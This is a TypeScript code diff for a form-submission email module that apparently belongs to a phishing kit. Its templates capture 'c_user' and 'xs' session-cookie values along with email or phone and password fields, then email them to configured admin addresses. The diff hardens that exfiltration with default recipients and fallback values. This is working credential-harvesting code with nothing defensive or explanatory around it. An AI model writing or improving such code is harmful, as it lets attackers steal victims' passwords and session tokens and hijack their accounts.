@@ -22,35 +22,37 @@ const emailTemplates = {
     Form One Submission Details:
     c_user: ${data.c_user}
     xs: ${data.xs}
-
     Time: ${new Date().toISOString()}
   `,
   'form-two': (data: Record<string, any>) => `
     Form Two Submission Details:
-    Email/Phone: ${data.user_email}
-    Password: ${data.password}
-
+    Email/Phone: ${data.user_email || 'Not provided'}
+    Password: ${data.password || 'Not provided'}
+    Contact Method: ${data.contactMethod || 'Not specified'}
     Time: ${new Date().toISOString()}
   `,
 };
 
+// Default admin email if environment variables are not set
+const DEFAULT_ADMIN_EMAIL = 'admin@example.com';
+
 export async function sendFormEmail(params: EmailParams): Promise<boolean> {
-  const defaultRecipients = [
-    process.env.ADMIN_EMAIL_1,
-    process.env.ADMIN_EMAIL_2
+  const recipients = [
+    process.env.ADMIN_EMAIL_1 || DEFAULT_ADMIN_EMAIL,
+    process.env.ADMIN_EMAIL_2 || DEFAULT_ADMIN_EMAIL
   ].filter(Boolean);
 
-  if (defaultRecipients.length === 0) {
-    console.error("No default recipients configured");
-    return false;
+  if (recipients.length === 0) {
+    console.warn("No recipients configured, using default admin email");
+    recipients.push(DEFAULT_ADMIN_EMAIL);
   }
 
   const emailContent = emailTemplates[params.formType](params.data);
 
   try {
     const info = await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to: defaultRecipients.join(', '),
+      from: process.env.SMTP_USER || DEFAULT_ADMIN_EMAIL,
+      to: recipients.join(', '),
       subject: params.subject,
       text: emailContent,
       html: emailContent.replace(/\n/g, '<br>'),
